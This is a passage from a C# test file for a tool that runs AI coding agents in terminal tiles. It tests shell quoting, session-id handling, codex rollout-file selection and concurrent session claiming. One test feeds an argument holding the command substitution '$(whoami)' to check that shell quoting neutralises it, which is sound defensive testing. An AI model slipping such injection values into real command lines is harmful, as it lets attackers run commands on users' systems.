        var instance = new AiAgentInstance
        {
            DefaultBehaviour = AiBehaviour.ToolDefault,
            DefaultEffort = AiEffort.ToolDefault,
            ExtraArgs = ["--note=$(whoami) it's \"here\""],
        };

        Assert.Equal("pi --session-id the-id '--note=$(whoami) it''s \"here\"'",
            new PiAgent().Interactive(Runtime(instance), "the-id", new PowerShellTerminal()).Startup);

        Assert.Equal("pi --session-id the-id '--note=$(whoami) it'\\''s \"here\"'",
            new PiAgent().Interactive(Runtime(instance), "the-id", new BashTerminal()).Startup);
    }

    /// <summary>
    /// The session id a tile runs under is the agent's to spell, and opencode's carries the prefix.
    /// </summary>
    /// <remarks>The tile used to build the id itself, which handed opencode a bare GUID — refused by
    /// the import document's own rule before the tile could launch at all. Every other agent takes the
    /// tile id verbatim, which is what the base class answers.</remarks>
    [Fact]
    public void Opencode_spells_a_tiles_session_id_with_its_own_prefix()
    {
        const string tileId = "1b9d6bcd-bbfd-4b2d-9b5d-ab8dfbbd4bed";

        Assert.Equal("ses_" + tileId, new OpenCodeAgent().SessionIdForTile(tileId));

        foreach (var agent in AiAgentCatalog.All.Where(a => a is not OpenCodeAgent))
            Assert.Equal(tileId, agent.SessionIdForTile(tileId));
    }

    /// <summary>
    /// agy's conversation id is read out of the JSON it prints, past whatever else it said.
    /// </summary>
    /// <remarks>Measured: an unknown id makes agy warn on one line and print its object on another, so
    /// parsing the whole of what came back as one document fails on exactly the run this exists to
    /// read.</remarks>
    [Fact]
    public void The_conversation_id_is_read_past_whatever_else_agy_printed()
    {
        var output = string.Join('\n',
            "warning: conversation \"83af41f4-0000-0000-0000-000000000000\" not found",
            "{\"conversation_id\":\"50c369cc-1111-2222-3333-444444444444\",\"status\":\"SUCCESS\"}");

        Assert.Equal("50c369cc-1111-2222-3333-444444444444", SessionCapture.ConversationIdIn(output));

        Assert.Null(SessionCapture.ConversationIdIn("nothing structured here"));
        Assert.Null(SessionCapture.ConversationIdIn("{\"status\":\"SUCCESS\"}"));
        Assert.Null(SessionCapture.ConversationIdIn(""));
        Assert.Null(SessionCapture.ConversationIdIn(null));
    }

    /// <summary>
    /// codex's id comes out of the newest rollout file, and only one this tile could have caused.
    /// </summary>
    /// <remarks>Without the cut-off the newest rollout on the machine is returned whether or not this
    /// tile caused it — and resuming a stranger's session is worse than starting a fresh one, because
    /// it silently continues somebody else's work in this repository.</remarks>
    [Fact]
    public void The_codex_session_is_the_newest_one_this_tile_could_have_started()
    {
        var root = Path.Combine(Path.GetTempPath(), "mtiles-codex-" + Guid.NewGuid().ToString("N"));
        var here = Path.Combine(root, "workspace");
        var day = Path.Combine(root, "2026", "08", "29");
        Directory.CreateDirectory(day);
        Directory.CreateDirectory(here);

        try
        {
            var older = Rollout(day, "11111111-2222-3333-4444-555555555555", here,
                DateTime.UtcNow.AddHours(-2));
            var newer = Rollout(day, "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee", here, DateTime.UtcNow);

            Assert.NotNull(older);
            Assert.NotNull(newer);

            Assert.Equal("aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
                SessionCapture.NewestSessionId(root, DateTimeOffset.UtcNow.AddHours(-1), here));

            // Nothing written since the tile started is nothing to resume.
            Assert.Null(SessionCapture.NewestSessionId(root, DateTimeOffset.UtcNow.AddMinutes(1), here));

            // A directory that is not there is not an error: it is a machine that has never run codex.
            Assert.Null(SessionCapture.NewestSessionId(Path.Combine(root, "nope"),
                DateTimeOffset.MinValue, here));
        }
        finally
        {
            Directory.Delete(root, recursive: true);
        }
    }

    /// <summary>
    /// Two tiles taking the same session at the same moment: exactly one of them gets it.
    /// </summary>
    /// <remarks>Two codex tiles restored from one layout capture on the thread pool together, so asking
    /// whether an id is free and claiming it afterwards lets both through: both write the same session
    /// into their layout and one conversation is lost at the next launch. The claim is therefore one
    /// step, and this drives the two halves against each other.</remarks>
    [Fact]
    public void Only_one_tile_can_claim_a_captured_session()
    {
        var sessionId = Guid.NewGuid().ToString();
        var holders = Enumerable.Range(0, 64).Select(i => $"tile-{i}").ToArray();
        var winners = new System.Collections.Concurrent.ConcurrentBag<string>();

        try
        {
            Parallel.ForEach(holders, holder =>
            {
                if (CapturedSessions.TryClaim(sessionId, holder))
                    winners.Add(holder);
            });

            Assert.Single(winners);

            // And the winner may take its own session again — a restart re-claims rather than losing it.
            Assert.True(CapturedSessions.TryClaim(sessionId, winners.Single()));
        }
        finally
        {
            foreach (var holder in holders)
                CapturedSessions.ReleaseAllOf(holder);
        }
    }

    /// <summary>
    /// A rollout another workspace — or another open tile — owns is never adopted.
    /// </summary>
    /// <remarks>codex appends to its rollout for the whole of a session, so a second codex running
    /// beside this one is the most recently written file on the machine for as long as it lasts. The
    /// timestamp cannot tell two live sessions apart; the recorded <c>cwd</c> separates two workspaces
    /// and the claim separates two tiles in one. Both tiles writing down the same id is one conversation
    /// silently lost at the next restart, which is the failure this asserts against.</remarks>
    [Fact]
    public void A_codex_session_another_tile_is_running_is_not_adopted()
    {
        var root = Path.Combine(Path.GetTempPath(), "mtiles-codex-" + Guid.NewGuid().ToString("N"));
        var here = Path.Combine(root, "workspace");
        var elsewhere = Path.Combine(root, "other-workspace");
        var day = Path.Combine(root, "2026", "08", "29");
        Directory.CreateDirectory(day);
        Directory.CreateDirectory(here);
        Directory.CreateDirectory(elsewhere);

        try
        {
            const string mine = "11111111-2222-3333-4444-555555555555";
            const string neighbours = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee";
            const string strangers = "99999999-8888-7777-6666-555555555555";

            Rollout(day, mine, here, DateTime.UtcNow.AddMinutes(-2));
            Rollout(day, neighbours, here, DateTime.UtcNow.AddMinutes(-1));
            // The most recently written of the three, and in another workspace.
            Rollout(day, strangers, elsewhere, DateTime.UtcNow);

            var since = DateTimeOffset.UtcNow.AddHours(-1);

            // The other workspace's session is out on its cwd alone, whatever its timestamp says.
            Assert.Equal(neighbours, SessionCapture.NewestSessionId(root, since, here));

            // And the one an open tile already holds falls to the next candidate rather than being
            // taken from it.
            Assert.Equal(mine,
                SessionCapture.NewestSessionId(root, since, here, id => id != neighbours));

            // A rollout that does not say where it started is not a candidate: a format change costs a
            // conversation, never somebody else's.
            File.WriteAllText(Path.Combine(day, $"rollout-2026-08-29T12-00-00-{strangers}.jsonl"),
                "{\"type\":\"session_meta\"}");
            Assert.Equal(neighbours, SessionCapture.NewestSessionId(root, since, here));
        }
        finally
        {
            Directory.Delete(root, recursive: true);
        }
    }

    /// <summary>Writes a rollout file the way codex does: one metadata line naming the directory the
    /// session started in.</summary>
    private static string Rollout(string day, string sessionId, string workingDirectory, DateTime written)
    {
        var path = Path.Combine(day, $"rollout-2026-08-29T10-00-00-{sessionId}.jsonl");
        var cwd = JsonSerializer.Serialize(workingDirectory);

        File.WriteAllText(path,
            $"{{\"type\":\"session_meta\",\"payload\":{{\"id\":\"{sessionId}\",\"cwd\":{cwd}}}}}");
        File.SetLastWriteTimeUtc(path, written);

        return path;
    }

    /// <summary>Both shapes codex has written its metadata line in, and everything else as silence.
    /// </summary>
    [Theory]
    [InlineData("{\"cwd\":\"D:/work\"}", "D:/work")]
    [InlineData("{\"type\":\"session_meta\",\"payload\":{\"cwd\":\"D:/work\"}}", "D:/work")]
    [InlineData("{\"payload\":{\"id\":\"x\"}}", null)]
    [InlineData("not json", null)]
    [InlineData("", null)]
    public void The_working_directory_is_read_from_either_shape_codex_writes(string line, string? expected)
        => Assert.Equal(expected, SessionCapture.CwdIn(line));

    /// <summary>
    /// The id is taken from the UUID's own shape, not by counting dashes.
    /// </summary>
    /// <remarks>codex's timestamp contains dashes too, so "everything after the second dash" is a rule
    /// that breaks the first time the stamp format changes — silently, into an id that resumes nothing.
    /// </remarks>
    [Theory]
    [InlineData("rollout-2026-08-29T10-00-00-aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee.jsonl",
        "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee")]
    [InlineData("rollout-1756-aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee.jsonl",
        "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee")]
    [InlineData("rollout-2026-08-29T10-00-00.jsonl", null)]
    [InlineData("something-else.jsonl", null)]
    public void A_rollout_file_name_yields_its_uuid(string fileName, string? expected)
    {
        Assert.Equal(expected, SessionCapture.SessionIdIn(fileName));
    }
}
